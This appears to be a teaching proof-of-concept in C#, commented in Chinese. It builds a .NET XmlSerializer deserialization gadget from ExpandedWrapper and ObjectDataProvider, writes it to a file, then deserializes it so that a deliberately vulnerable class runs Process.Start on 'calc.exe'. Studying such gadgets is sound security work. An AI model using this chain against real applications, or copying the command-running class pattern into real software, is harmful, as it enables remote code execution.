using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Xml.Serialization;
using System.Data.Services.Internal;
using System.Windows.Data;
using System.ComponentModel;

namespace Deserialize
{

    // 这是一个模拟的可被利用的类
    [XmlRoot]
    public class TestClass
    {
        private string classname;
        private string name;
        private int age;
        [XmlAttribute]
        public string Classname { get => classname; set => classname = value; }
        [XmlElement]
        public string Name { get => name; set => name = value; }
        [XmlElement]
        public int Age { get => age; set => age = value; }

        public override string ToString()
        {
            return base.ToString();
        }

        public void ClassMethod(string cmd)
        {
            System.Diagnostics.Process.Start(cmd);
        }
    }



    class Program
    {
        // 序列化，生成攻击payload
        public static void serializeObjectWithXmlSer()
        {

            ExpandedWrapper<TestClass, ObjectDataProvider> wrapper = new ExpandedWrapper<TestClass, ObjectDataProvider>();
            wrapper.ProjectedProperty0 = new ObjectDataProvider();
            wrapper.ProjectedProperty0.ObjectInstance = new TestClass();
            //wrapper.ProjectedProperty0.ObjectType = typeof(TestClass);
            wrapper.ProjectedProperty0.MethodName = "ClassMethod";
            wrapper.ProjectedProperty0.MethodParameters.Add("calc.exe");

            XmlSerializer serializer = new XmlSerializer(typeof(ExpandedWrapper<TestClass, ObjectDataProvider>));
            TextWriter fo = new StreamWriter("./xmlser.txt");
            serializer.Serialize(fo, wrapper);
            fo.Close();
        }

        // 反序列化payload, 代码执行
        public static void DeserializerFromXml()
        {
            using (var stream = new FileStream("./xmlser.txt", FileMode.Open))
            {
                var wrapper = new ExpandedWrapper<TestClass, ObjectDataProvider>();
                Type targetType = wrapper.GetType();
                String targetTypeName = targetType.AssemblyQualifiedName;
                Console.Write(targetTypeName);
                var serializers = new XmlSerializer(Type.GetType(targetTypeName));
                serializers.Deserialize(stream);
            }
        }

        static void Main(string[] args)
        {
            serializeObjectWithXmlSer();
            DeserializerFromXml();
        }
    }
}
